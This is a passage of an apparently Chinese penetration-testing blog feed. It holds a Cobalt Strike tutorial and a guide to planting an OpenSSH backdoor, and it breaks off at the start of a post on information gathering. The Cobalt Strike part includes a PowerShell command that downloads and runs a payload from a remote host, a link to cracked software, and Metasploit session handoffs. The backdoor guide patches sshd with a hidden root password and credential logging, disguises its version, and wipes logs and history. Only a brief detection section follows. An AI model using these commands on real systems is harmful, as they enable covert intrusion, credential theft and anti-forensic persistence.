<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Applications  #显示受害者机器的应用信息</div><div class="line">Credentials  #凭证当通过hashdump或者Mimikatz抓取过的密码都会储存在这里。</div><div class="line">Downloads  #下载文件</div><div class="line">Event Log  #主机上线记录以及团队协作聊天记录</div><div class="line">Keystrokes  #键盘记录</div><div class="line">Proxy Pivots  #代理模块</div><div class="line">Screenshots  #进程截图</div><div class="line">Script Console  #控制台,在这里可以加载[各种脚本](https://github.com/rsmudge/cortana-scripts)以增强功能</div><div class="line">Targets  #显示目标</div><div class="line">Web Log  #Web访问记录</div></pre></td></tr></table></figure>
</li>
<li><p>Attacks</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Packages  #攻击包</div><div class="line">  HTML Application   生成恶意的HTA木马文件</div><div class="line">  MS Office Macro   生成office宏病毒文件</div><div class="line">  Payload Generator   生成各种语言版本的payload</div><div class="line">  USB/CD AutoPlay   生成利用自动播放运行的木马文件</div><div class="line">  Windows Dropper   捆绑器，能够对文档类进行捆绑</div><div class="line">  Windows Executable   生成可执行exe木马</div><div class="line">  Windows Executable(S)  生成无状态的可执行exe木马</div><div class="line">Web Drive-by  #钓鱼攻击</div><div class="line">  Manage  对开启的web服务进行管理</div><div class="line">  Clone Site  克隆网站，可以记录受害者提交的数据</div><div class="line">  Host File  提供一个文件下载，可以修改Mime信息</div><div class="line">  PowerShell Web Delivery  类似于msf 的web_delivery </div><div class="line">  Signed Applet Attack  使用java自签名的程序进行钓鱼攻击</div><div class="line">  Smart Applet Attack  自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本</div><div class="line">  System Profiler  用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</div><div class="line">Spear Phish  #用来邮件钓鱼的模块</div></pre></td></tr></table></figure>
</li>
<li><p>Reporting</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">activity report  #活动报告生成</div><div class="line">Hosts report  #主机报告</div><div class="line">Indicators opromisef com   #目标报告</div><div class="line">Sessions report  #会话报告</div><div class="line">Social engineering report  #社会工程报告</div><div class="line">Export data   #数据出口</div></pre></td></tr></table></figure>
</li>
<li><p>help</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Homepage  #官方主页</div><div class="line">Support  #技术支持</div><div class="line">Arsenal  #开发者</div><div class="line">System information  #版本信息</div><div class="line">About  #关于</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h2><p>　　首先使用Cobalt Strike需要创建一个Listener，点击 Cobalt Strike-&gt;Listeners ，然后点击Add便可以创建自己想要的Listeners了，Cobalt Strike3.6包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">windows/beacon_dns/reverse_dns_txt</div><div class="line">windows/beacon_dns/reverse_http</div><div class="line">windows/beacon_http/reverse_http</div><div class="line">windows/beacon_https/reverse_https</div><div class="line">windows/beacon_smb/bind_pipe</div><div class="line">windows/foreign/reverse_dns_txt</div><div class="line">windows/foreign/reverse_http</div><div class="line">windows/foreign/reverse_https</div><div class="line">windows/foreign/reverse_tcp</div></pre></td></tr></table></figure></p>
<p>　　其中windows/beacon是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign为外部监听器，即msf或者Armitage的监听器。 选择监听器以后，host会自动填写我们开启服务时的ip，配置监听端口，然后保存，监听器就创建好了。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-27/29632476.jpg" alt=""><br>　　在创建好监听器，接下来就需要配置我们的客户端了，Cobalt Strike提供了多种包括攻击方式，在这里我们使用Powershell进行攻击。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/7581397.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/46855327.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.3.83:8888/a&apos;))&quot;</div></pre></td></tr></table></figure></p>
<p>　　当我们在目标靶机运行上面这条Powershell之后，我们的Cobalt Strike客户端就会监听到我们的反弹链接，我们就可以看到已经有目标机上线。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-28/28125408.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">beacon&gt; help    </div><div class="line"></div><div class="line">Beacon Commands</div><div class="line">===============    </div><div class="line"></div><div class="line">    Command                   Description</div><div class="line">    -------                   -----------</div><div class="line">    browserpivot              Setup a browser pivot session </div><div class="line">    bypassuac                 Spawn a session in a high integrity process</div><div class="line">    cancel                    Cancel a download that&apos;s in-progress</div><div class="line">    cd                        Change directory</div><div class="line">    checkin                   Call home and post data</div><div class="line">    clear                     Clear beacon queue</div><div class="line">    covertvpn                 Deploy Covert VPN client</div><div class="line">    desktop                   View and interact with target&apos;s desktop</div><div class="line">    dllinject                 Inject a Reflective DLL into a process</div><div class="line">    download                  Download a file</div><div class="line">    downloads                 Lists file downloads in progress</div><div class="line">    drives                    List drives on target</div><div class="line">    elevate                   Try to elevate privileges</div><div class="line">    execute                   Execute a program on target</div><div class="line">    exit                      Terminate the beacon session</div><div class="line">    getsystem                 Attempt to get SYSTEM</div><div class="line">    getuid                    Get User ID</div><div class="line">    hashdump                  Dump password hashes</div><div class="line">    help                      Help menu</div><div class="line">    inject                    Spawn a session in a specific process</div><div class="line">    jobkill                   Kill a long-running post-exploitation task</div><div class="line">    jobs                      List long-running post-exploitation tasks</div><div class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</div><div class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</div><div class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</div><div class="line">    keylogger                 Inject a keystroke logger into a process</div><div class="line">    kill                      Kill a process</div><div class="line">    link                      Connect to a Beacon peer over SMB</div><div class="line">    logonpasswords            Dump credentials and hashes with mimikatz</div><div class="line">    ls                        List files</div><div class="line">    make_token                Create a token to pass credentials</div><div class="line">    mimikatz                  Runs a mimikatz command</div><div class="line">    mkdir                     Make a directory</div><div class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</div><div class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</div><div class="line">    mode http                 Use HTTP as data channel</div><div class="line">    mode smb                  Use SMB peer-to-peer communication</div><div class="line">    net                       Network and host enumeration tool</div><div class="line">    note                      Assign a note to this Beacon       </div><div class="line">    portscan                  Scan a network for open services</div><div class="line">    powershell                Execute a command via powershell</div><div class="line">    powershell-import         Import a powershell script</div><div class="line">    ps                        Show process list</div><div class="line">    psexec                    Use a service to spawn a session on a host</div><div class="line">    psexec_psh                Use PowerShell to spawn a session on a host</div><div class="line">    pth                       Pass-the-hash using Mimikatz</div><div class="line">    pwd                       Print current directory</div><div class="line">    rev2self                  Revert to original token</div><div class="line">    rm                        Remove a file or folder</div><div class="line">    rportfwd                  Setup a reverse port forward</div><div class="line">    runas                     Execute a program as another user</div><div class="line">    screenshot                Take a screenshot</div><div class="line">    shell                     Execute a command via cmd.exe</div><div class="line">    sleep                     Set beacon sleep time</div><div class="line">    socks                     Start SOCKS4a server to relay traffic</div><div class="line">    socks stop                Stop SOCKS4a server</div><div class="line">    spawn                     Spawn a session </div><div class="line">    spawnas                   Spawn a session as another user</div><div class="line">    spawnto                   Set executable to spawn processes into</div><div class="line">    steal_token               Steal access token from a process</div><div class="line">    timestomp                 Apply timestamps from one file to another</div><div class="line">    unlink                    Disconnect from parent Beacon</div><div class="line">    upload                    Upload a file</div><div class="line">    wdigest                   Dump plaintext credentials with mimikatz</div><div class="line">    winrm                     Use WinRM to spawn a session on a host</div><div class="line">    wmi                       Use WMI to spawn a session on a host</div></pre></td></tr></table></figure></p>
<h2 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h2><ul>
<li>cs获得了一个上线机器，想把这个机器丢给msf中的meterpreter获得一个session进行控制<br>这里我们已经获得了一个上线机器。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/36673716.jpg" alt=""></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp  ##不要用x64的payload</div><div class="line">payload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.3.72 </div><div class="line">lhost =&gt; 192.168.3.72</div><div class="line">msf exploit(handler) &gt; set lport 5555</div><div class="line">lport =&gt; 5555</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/32289071.jpg" alt=""><br>之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf所监听的端口，<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/11904514.jpg" alt=""><br>然后选中计算机，右键-&gt;Spawn:选择刚刚创建的监听器：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/28119518.jpg" alt=""><br>这个时候我们可以看到，msf上的监听已经上线，我们可以进行我们想要的一些操作了。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/38295312.jpg" alt=""></p>
<ul>
<li>msf获得了一个meterpreter的session，想把session传给cs<br>这里我们已经获得了一个meterpreter的session<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/30231268.jpg" alt=""><br>在CS中创建一个监听者，和上一步类似，这里host需要修改为CS客户端IP，创建好之后我们便监听着6666端口，等待着被控机连接。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/95252236.jpg" alt=""><br>此时切我们换到meterpreter中，<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; background # 切换到后台</div><div class="line">msf exploit(handler) &gt; use exploit/windows/local/payload_inject # 这个exploit是注入一个新的payload 到当前的session里面</div><div class="line">msf exploit(payload_inject) &gt; set payload windows/meterpreter/reverse_http # 不能使用x64的payload</div><div class="line">payload =&gt; windows/meterpreter/reverse_http</div><div class="line">msf exploit(payload_inject) &gt; set DisablePayloadHandler true  # 关闭msf payload的监听，可以不用设置，不影响效果</div><div class="line">msf exploit(payload_inject) &gt; set lhost 192.168.3.103 # cs的服务端IP</div><div class="line">lhost =&gt; 192.168.3.103</div><div class="line">msf exploit(payload_inject) &gt; set lport 6666 # 监听者的监听端口</div><div class="line">lport =&gt; 6666</div><div class="line">msf exploit(payload_inject) &gt; set session 1 # 这里是之前meterpreter的session编号</div><div class="line">session =&gt; 1</div><div class="line">msf exploit(payload_inject) &gt; exploit</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/71953062.jpg" alt=""><br>此时机器便已成功从cs成功上线，可以进行各种姿势的操作。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/35086766.jpg" alt=""></p>
<ul>
<li>cs获得了一个上线机器，想把这个机器丢给msf中继续进行渗透<br>根据上线的肉鸡，可以使用SOCKS代理<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-24/9205148.jpg" alt=""><br>配置proxychains.conf，添加socks4 127.0.0.1 32557，然后就可以通过proxychains 使用各种工具做内网渗透了</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。Cobalt Strike主要用于团队作战，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。&lt;br&gt;　　&lt;a href=&quot;https://cobaltstrike.com/&quot;&gt;Cobalt Strike&lt;/a&gt;，据说现在最新版为3.9，主要分为试用版和付费版，试用版为21天，付费版3500美元，据说网上也有一些&lt;a href=&quot;http://www.cnblogs.com/haq5201314/p/7040832.html&quot;&gt;破解教程&lt;/a&gt;，&lt;a href=&quot;https://pan.baidu.com/s/1qYocNbm&quot;&gt;cobaltstrik3.6破解版下载&lt;/a&gt; 密码: 51tg。因为Cobalt Strike是美国对外限制型出口软件，只在美国和加拿大允许发售，所以我们需要google搜索下usa的个人代理来绕开限制。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="工具" scheme="https://zjw.dropsec.xyz/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux渗透之OpenSSH后门</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/09/26/Linux%E6%B8%97%E9%80%8F%E4%B9%8BOpenSSH%E5%90%8E%E9%97%A8.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/09/26/Linux渗透之OpenSSH后门.html</id>
    <published>2017-09-26T12:59:04.000Z</published>
    <updated>2018-01-14T08:55:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。<br>　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4</p>
<h3 id="0x01-查看版本"><a href="#0x01-查看版本" class="headerlink" title="0x01 查看版本"></a>0x01 查看版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -V</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>Centos 7.0<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42766212.jpg" alt=""><br>Ubuntu 16.0.4<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/78241917.jpg" alt=""><br>有必要的话需要对原ssh配置文件进行备份，可以对后期的文件时间进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp -p /etc/ssh/ssh_config  / etc/ssh/ssh_config.bak</div><div class="line">cp -p /etc/ssh/sshd_config  / etc/ssh/sshd_config.bak</div></pre></td></tr></table></figure></p>
<h3 id="0x02-下载SSH配置文件"><a href="#0x02-下载SSH配置文件" class="headerlink" title="0x02 下载SSH配置文件"></a>0x02 下载SSH配置文件</h3><p><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz" target="_blank" rel="external">openssh-5.9p1.tar.gz</a><br><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz" target="_blank" rel="external">openssh-5.9p1.patch.tar.gz</a><br>　　使用wget进行远程下载，如果没有安装wget，可以安装可以直接下载openssh源码，也可以使用菜刀大马等上传上去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Centos:yum -y install wget</div><div class="line">Ubuntu:apt-get install wget</div></pre></td></tr></table></figure></p>
<h3 id="0x03-编辑安装"><a href="#0x03-编辑安装" class="headerlink" title="0x03 编辑安装"></a>0x03 编辑安装</h3><p>Centos 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar zxvf openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.patch.tar.gz</div><div class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面</div><div class="line">patch &lt; sshbd5.9p1.diff</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/4576919.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/76087726.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/66109180.jpg" alt=""><br>可能遇到的问题patch未安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install patch</div></pre></td></tr></table></figure></p>
<p>Ubuntu 16.0.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server   #安装SSH</div><div class="line">sudo service ssh start</div><div class="line"></div><div class="line">vim /etc/ssh/sshd_config #设置root连接ssh</div><div class="line"></div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin prohibit-password</div><div class="line">StrictModes yes</div><div class="line">改成</div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin yes</div><div class="line">StrictModes yes</div><div class="line"></div><div class="line">/etc/init.d/ssh restart   #重启</div></pre></td></tr></table></figure></p>
<p>　　编辑安装Centos 7和Ubuntu 16.0.4过程一样，就不过多介绍了。</p>
<h3 id="0x04-修改后门密码和文件记录"><a href="#0x04-修改后门密码和文件记录" class="headerlink" title="0x04 修改后门密码和文件记录"></a>0x04 修改后门密码和文件记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim includes.h</div><div class="line">int secret_ok;</div><div class="line">FILE *f;</div><div class="line">#define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码</div><div class="line">#define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码</div><div class="line">#define SECRETPW &quot;warden&quot; # 远程连接密码</div><div class="line">#endif /* INCLUDES_H */</div></pre></td></tr></table></figure>
<p>　　可以对后门密码和记录文件进行修改，在文件前面加上.相当于是隐藏文件，也可以换个隐蔽的目录。修改之后的<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/1960037.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim version.h</div><div class="line">/* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */</div><div class="line">#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;</div><div class="line">#define SSH_PORTABLE &quot;p1&quot;</div><div class="line">#define SSH_RELEASE SSH_VERSION SSH_PORTABLE</div></pre></td></tr></table></figure></p>
<p>　　可以根据我们刚才的查看的版本信息进行修改，使其版本一致不易被管理员发现和察觉。</p>
<h3 id="0x05-编译安装"><a href="#0x05-编译安装" class="headerlink" title="0x05 编译安装"></a>0x05 编译安装</h3><p>Centos 7<br>首先对ssh里面的几个key的权限进行修改，否则可能进行编译的时候key不能修改而报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod 620 moduli</div><div class="line">chmod 600 sshd_config ssh_host_ecdsa_key ssh_host_rsa_key</div><div class="line">chmod 644 ssh_config ssh_host_ecdsa_key.pub ssh_host_rsa_key.pub</div></pre></td></tr></table></figure></p>
<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl openssl-devel pam-devel zlib zlib-devel</div><div class="line">./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/45803683.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42590305.jpg" alt=""></p>
<p>Ubuntu 16.04</p>
<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get install -y openssl libssl-dev libpam0g-dev</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">/etc/init.d/ssh restart</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/58021783.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/59095904.jpg" alt=""></p>
<h3 id="0x06-系统优化"><a href="#0x06-系统优化" class="headerlink" title="0x06 系统优化"></a>0x06 系统优化</h3><p>　　恢复新配置文件的日期跟旧文件日期一致对ssh_config和sshd_config新旧文件进行内容对比，使其配置文件一致，然后在修改文件日期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</div><div class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>清除操作日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">export HISTFILE=/dev/null</div><div class="line">export HISTSIZE=0</div><div class="line">cd /etc/httpd/logs/</div><div class="line">sed -i ‘/192.168.52.175/d’ access_log*</div><div class="line">echo &gt;/root/.bash_history //清空操作日志</div></pre></td></tr></table></figure></p>
<h3 id="0x07-修复方案与应急响应"><a href="#0x07-修复方案与应急响应" class="headerlink" title="0x07 修复方案与应急响应"></a>0x07 修复方案与应急响应</h3><p>1）重装openssh软件<br>2）SSH禁止对外开放</p>
<p>应急响应：<br>1）比对ssh的版本<br>ssh -V<br>2）查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>3）strings检查/usr/sbin/sshd，看是否有邮箱信息<br>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。<br>4）通过strace监控sshd进程读写文件的操作<br>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps axu | grep sshd | grep -v grep</div><div class="line">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</div><div class="line">strace -o aa -ff -p 65530</div><div class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</div><div class="line">aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。&lt;br&gt;　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4&lt;/p&gt;
&lt;h3 id=&quot;0x01-查看版本&quot;&gt;&lt;a href=&quot;#0x01-查看版本&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看版本&quot;&gt;&lt;/a&gt;0x01 查看版本&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ssh -V&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="后门" scheme="https://zjw.dropsec.xyz/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--01信息搜集</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-01%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/08/03/渗透测试-01信息搜集.html</id>
    <published>2017-08-03T04:06:17.000Z</published>
    <updated>2017-08-03T08:34:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　信息搜集是渗透目标的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p>
<h2 id="0x01-搜索引擎"><a href="#0x01-搜索引擎" class="headerlink" title="0x01 搜索引擎"></a>0x01 搜索引擎</h2><p>Google、Bing、ZoomEye（钟馗之眼）、Shodan（撒旦）</p>
<ul>
<li><p>Google hacking<a id="more"></a></p>
